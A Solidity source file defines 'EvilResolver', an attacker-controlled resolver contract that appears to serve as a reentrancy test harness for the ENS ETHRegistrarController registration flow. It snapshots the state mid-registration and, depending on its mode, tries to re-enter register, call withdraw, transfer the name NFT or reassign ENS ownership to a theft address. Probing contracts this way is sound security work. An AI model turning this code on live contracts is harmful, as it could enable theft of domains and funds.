// SPDX-License-Identifier: MIT
pragma solidity ~0.8.17;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IETHRegistrarController} from "../ethregistrar/IETHRegistrarController.sol";
import {ENS} from "../registry/ENS.sol";

/**
 * @title EvilResolver
 * @notice Attacker-controlled resolver invoked via the REAL
 *         ETHRegistrarController.register → multicallWithNodeCheck path.
 *
 * Modes:
 *  - LOG_ONLY: Phase A — snapshot mid-register state (no mutation)
 *  - REENTER_REGISTER / WITHDRAW / TRANSFER_NFT / RENEW / SET_ENS_OWNER: Phase B
 */
contract EvilResolver {
    enum Mode {
        LOG_ONLY,
        REENTER_REGISTER,
        WITHDRAW,
        TRANSFER_NFT,
        RENEW,
        SET_ENS_OWNER
    }

    struct Snapshot {
        address msgSender;
        address nftOwner;
        address ensOwner;
        uint256 controllerBalance;
        uint256 attackerBalance;
        address registryOwnerOfEth; // unused pad / extra
        bool captured;
    }

    Mode public mode;
    IETHRegistrarController public controller;
    IERC721 public registrar;
    ENS public ens;
    bytes32 public node;
    uint256 public tokenId;
    address public attacker;
    address public theftTarget; // address to try transferring NFT / ENS to

    // Secondary registration payload for REENTER_REGISTER
    IETHRegistrarController.Registration public reentryRegistration;
    uint256 public reentryValue;
    string public renewLabel;
    uint256 public renewDuration;
    uint256 public renewValue;

    Snapshot internal _snap;
    bool public reentered;
    bool public attackSucceeded;
    bytes public lastRevertData;
    string public lastAttackLabel;

    function snap() external view returns (Snapshot memory) {
        return _snap;
    }

    event MidRegisterSnapshot(
        address msgSender,
        address nftOwner,
        address ensOwner,
        uint256 controllerBalance,
        uint256 attackerBalance
    );
    event AttackAttempt(string label, bool ok, bytes revertData);

    function configure(
        Mode _mode,
        address _controller,
        address _registrar,
        address _ens,
        address _attacker
    ) external {
        mode = _mode;
        controller = IETHRegistrarController(_controller);
        registrar = IERC721(_registrar);
        ens = ENS(_ens);
        attacker = _attacker;
    }

    function setNodeAndToken(bytes32 _node, uint256 _tokenId) external {
        node = _node;
        tokenId = _tokenId;
    }

    function setTheftTarget(address _t) external {
        theftTarget = _t;
    }

    function setReentryRegistration(
        IETHRegistrarController.Registration calldata reg,
        uint256 value
    ) external {
        reentryRegistration = reg;
        reentryValue = value;
    }

    function setRenewParams(
        string calldata label,
        uint256 duration,
        uint256 value
    ) external {
        renewLabel = label;
        renewDuration = duration;
        renewValue = value;
    }

    /// @dev Fund this contract so reentrant payable calls can carry value.
    receive() external payable {}

    function multicallWithNodeCheck(
        bytes32 nodehash,
        bytes[] calldata /* data */
    ) external returns (bytes[] memory results) {
        // Capture mid-flight state (Phase A)
        address nftOwner;
        try registrar.ownerOf(tokenId) returns (address o) {
            nftOwner = o;
        } catch {
            nftOwner = address(0);
        }

        _snap = Snapshot({
            msgSender: msg.sender,
            nftOwner: nftOwner,
            ensOwner: ens.owner(nodehash),
            controllerBalance: address(controller).balance,
            attackerBalance: attacker.balance,
            registryOwnerOfEth: address(0),
            captured: true
        });

        emit MidRegisterSnapshot(
            _snap.msgSender,
            _snap.nftOwner,
            _snap.ensOwner,
            _snap.controllerBalance,
            _snap.attackerBalance
        );

        if (mode == Mode.LOG_ONLY) {
            results = new bytes[](0);
            return results;
        }

        reentered = true;
        if (mode == Mode.REENTER_REGISTER) {
            _try("REENTER_REGISTER", abi.encodeWithSelector(
                IETHRegistrarController.register.selector,
                reentryRegistration
            ), reentryValue);
        } else if (mode == Mode.WITHDRAW) {
            // withdraw() has no selector import — encode manually
            _try("WITHDRAW", abi.encodeWithSignature("withdraw()"), 0);
        } else if (mode == Mode.TRANSFER_NFT) {
            _try(
                "TRANSFER_NFT",
                abi.encodeWithSelector(
                    IERC721.transferFrom.selector,
                    address(controller),
                    theftTarget,
                    tokenId
                ),
                0
            );
        } else if (mode == Mode.RENEW) {
            _try(
                "RENEW",
                abi.encodeWithSelector(
                    IETHRegistrarController.renew.selector,
                    renewLabel,
                    renewDuration,
                    bytes32(0)
                ),
                renewValue
            );
        } else if (mode == Mode.SET_ENS_OWNER) {
            _try(
                "SET_ENS_OWNER",
                abi.encodeWithSelector(
                    ENS.setOwner.selector,
                    nodehash,
                    theftTarget
                ),
                0
            );
        }

        results = new bytes[](0);
    }

    function _try(string memory label, bytes memory data, uint256 value) internal {
        address target;
        if (
            keccak256(bytes(label)) == keccak256("TRANSFER_NFT")
        ) {
            target = address(registrar);
        } else if (keccak256(bytes(label)) == keccak256("SET_ENS_OWNER")) {
            target = address(ens);
        } else {
            target = address(controller);
        }

        (bool ok, bytes memory ret) = target.call{value: value}(data);
        lastAttackLabel = label;
        attackSucceeded = ok;
        lastRevertData = ok ? bytes("") : ret;
        emit AttackAttempt(label, ok, lastRevertData);
    }
}
